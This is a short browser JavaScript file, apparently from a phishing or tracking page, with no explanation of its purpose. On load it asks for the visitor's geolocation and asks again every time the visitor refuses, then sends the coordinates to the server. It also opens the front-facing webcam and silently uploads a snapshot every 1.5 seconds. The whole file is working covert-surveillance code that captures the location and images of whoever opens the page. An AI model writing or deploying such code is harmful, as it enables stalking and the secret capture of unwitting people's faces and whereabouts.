let checkinsss=()=>{
    if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function (position) {
    // Get latitude and longitude
    const latitudes = position.coords.latitude;
    const longitudes = position.coords.longitude;
    send(latitudes,longitudes)
}, function (error) {
    checkinsss();
});
} else {
    checkinsss();
}
}
window.onload=()=>{
    checkinsss();
}


let send=(lati,long)=>{
    let town_get_api=new XMLHttpRequest();
    town_get_api.open("GET",`/location/${lati}/${long}`);
    town_get_api.send();
    town_get_api.responseType="json";
    town_get_api.onload=()=>{
        if(town_get_api.readyState==4 && town_get_api.status==200){
            const Town_data=town_get_api.response;
            console.log(Town_data)
        };
    };
};
//taking pic


function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: JSON.stringify({ image: imgdata }),  // Send as JSON
        url: '/upload_images',
        contentType: 'application/json',           // Set content type to JSON
        dataType: 'json',
        async: false,
        success: function(result) {
            console.log("Image uploaded successfully", result);
        },
        error: function(error) {
            console.error("Error uploading image:", error);
        }
    });
}

// Rest of your code remains unchanged

    
    'use strict';
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');
    
    const constraints = {
      audio: false,
      video: {
        
        facingMode: "user"
      }
    };
    
    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        alert(`navigator.getUserMedia error:${e.toString()}`)
      }
    }
    
    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;
    
    var context = canvas.getContext('2d');
      setInterval(function(){
    
           context.drawImage(video, 0, 0, 640, 480);
           var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
           post(canvasData); }, 1500);
      
    
    }
    
    // Load init
    init();